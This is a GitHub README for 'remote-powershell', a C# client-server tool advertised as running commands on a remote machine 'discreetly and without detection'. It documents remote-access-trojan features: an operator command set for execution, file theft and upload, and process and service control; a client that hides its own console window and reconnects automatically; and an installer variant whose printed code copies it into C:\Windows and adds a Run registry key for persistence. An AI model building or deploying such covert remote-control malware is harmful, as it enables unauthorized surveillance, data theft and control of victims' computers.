# remote-powershell

This is a terminal-based application that enables you to execute PowerShell commands on a remote client discreetly and without detection.

The application is divided into two main sections: client and server. And there are also special versions of sections that have additional functionality. Each of the sections and versions is briefly described below, as well as a short guide on how to set them up.

## server 

[Click to view](https://github.com/shead0shead/remote-powershell/tree/main/src/server)

The server folder contains all the files related to the part of the program that should be executed on the device from which the commands will be sent.

Just change the IP and Port to the one you need and run the program while waiting for connections.

```csharp
protected static string ipAddress = "127.0.0.1"; // Change 127.0.0.1 (IP) to the one you need
protected static int port = 8802;                // Change 8802 (Port) to the one you need      
```

All available commands list:

| Command           | Description                                                                  | Syntax                        | Aliases    |
| ----------------- | ---------------------------------------------------------------------------- | ----------------------------- | ---------- |
| help              | Shows a list of all available commands                                       | help                          | ?          |
| shorts            | Shows a list of shortcuts/aliases commands                                   | shorts                        | $          |
| execute           | Sends and executes the command you specified on the remote client's computer | execute [client-id] [command] | exec, !    |
| download          | Downloads the file you specified from a remote client's computer             | download [client-id] [path]   | dload, +   |
| upload            | Uploads the file you specified to a remote client's computer                 | upload [client-id] [path]     | uload, =   |
| connection-list   | Gives a list of all active remote connections                                | connection-list               | con-list   |
| connection-remove | Forcibly disconnects the specified remote client from the server             | connection-remove [client-id] | con-remove |
| window-show       | Shows a terminal window on the remote client's computer                      | window-show [client-id]       |            |
| window-hide       | Hides a terminal window on the remote client's computer                      | window-hide [client-id]       |            |
| clear             | Clears the terminal                                                          | clear                         | clr        |
| quit              | Closes the application                                                       | quit                          | exit       |

Despite the fact that the disconnect command forcibly disconnects the remote client from the server, the automatic reconnection function in the client can still restore connections after a while.

Shortcuts/aliases commands list:

| Command           | Description                       | Syntax                                        | Aliases   |
| ----------------- | --------------------------------- | ------------------------------------------ | --------- |
| systeminfo        | Get system information            | systeminfo [client-id]                  |           |
| processlist       | Get list of processes             | processlist [client-id]                 |           |
| killprocess       | Kill a process                    | killprocess [client-id] [process-id]    | kill      |
| installedprograms | Get list of installed programs    | installedprograms [client-id]           |           |
| shutdown          | Shutdown remote client            | shutdown [client-id]                    |           |
| restart           | Restart remote client             | restart [client-id]                     |           |
| networkinterfaces | Get network interfaces            | networkinterfaces [client-id]           |           |
| listfiles         | List files in a directory         | listfiles [client-id] [path]            | ls        |
| mkdir             | Create a directory                | mkdir [client-id] [path]                | createdir |
| rm                | Remove a file or directory        | rm [client-id] [path]                   | remove    |
| pwd               | Get current working directory     | pwd [client-id]                         |           |
| cd                | Change current directory          | cd [client-id] [path]                   | changedir |
| diskinfo          | Get disk information              | diskinfo [client-id]                    |           |
| userlist          | Get list of users                 | userlist [client-id]                    |           |
| batteryinfo       | Get battery information (laptops) | batteryinfo [client-id]                 |           |
| servicelist       | Get list of services              | servicelist [client-id]                 |           |
| startservice      | Start a service                   | startservice [client-id] [service-name] |           |
| stopservice       | Stop a service                    | stopservice [client-id] [service-name]  |           |
| tasklist          | Get list of scheduled tasks       | tasklist [client-id]                    |           |
| starttask         | Start a scheduled task            | starttask [client-id] [task-name]       |           |
| stoptask          | Stop a scheduled task             | stoptask [client-id] [task-name]        |           |
| eventlog          | Get event log information         | eventlog [client-id]                    |           |
| runningservices   | Get running services              | runningservices [client-id]             |           |
| runningprocesses  | Get running processes             | runningprocesses [client-id]            |           |
| runningtasks      | Get running scheduled tasks       | runningtasks [client-id]                |           |

You can change the path where files uploaded from the client to the server will be saved, as shown below.

```csharp
public async Task RecieveFileAsync(string path)
{
    ...
    // Replace the savePath string with the path where the files will be saved from the client
    string savePath = $@"C:\Users\{Environment.UserName}\Downloads\{Path.GetFileNameWithoutExtension(path)}_(recieved){Path.GetExtension(path)}";
    ...
}
```

Use the code below to get the original file name and extension.

```csharp
{Path.GetFileNameWithoutExtension(path)}/*Suffix to file name (Optional)*/{Path.GetExtension(path)}
```

## client

[Click to view](https://github.com/shead0shead/remote-powershell/tree/main/src/client)

The client folder contains all the files related to the part of the program that should be executed on the device to which the commands will be sent and executed.

Just change the IP and Port to the ones you installed on the server and run the program on another device.

```csharp
string host = "127.0.0.1"; // Change 127.0.0.1 (IP) to the one you need
int port = 8802;           // Change 8802 (Port) to the one you need
```

If you don't want the application to be automatically hidden after launch, delete the code shown below.

```csharp
[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

const int SW_HIDE = 0;
const int SW_SHOW = 5;

var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);
```

You can also delete only the last line shown, this will also make the app visible after launch.

You can change the path where files uploaded to the client from the server will be saved as shown below.

```csharp
async Task RecieveFileAsync(string path)
{
    ...
    // Replace savePath string with the path where the files will be saved on the client
    string savePath = $@"C:\Users\{Environment.UserName}\Downloads\{Path.GetFileNameWithoutExtension(path)}_(upload-func){Path.GetExtension(path)}";
    ...
}
```

Use the code below to get the original file name and extension.

```csharp
{Path.GetFileNameWithoutExtension(path)}/*Suffix to file name (Optional)*/{Path.GetExtension(path)}
```

Please note that if you use services that will help you expand your local network, such as ngrok, then you may have problems reconnecting the client to the server after it is turned off, since the connection for the client will remain active.

## client-and-installer

[Click to view](https://github.com/shead0shead/remote-powershell/tree/main/src/client-and-installer)

Client-and-installer is a version of the application that, when launched, automatically installs the client on a remote computer and adds it to Windows Startup.

```csharp
// Instead of "C:\Windows\client.exe" enter the path where the hidden client will be installed
if (Environment.ProcessPath != @"C:\Windows\client.exe")
{
    // Instead of "C:\Windows\client.exe" enter the path where the hidden client will be installed
    string path = @"C:\Windows\client.exe";
    ...
}
```

Сlient-and-installer automatically adds the application to Windows startup, if you want to remove it, then go to the Program.cs file in the client-and-installer folder and remove all lines from 15th to 17th.

```csharp
// Autorun code
RegistryKey registry;
registry = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
registry.SetValue("client", @"C:\Windows\client.exe");
```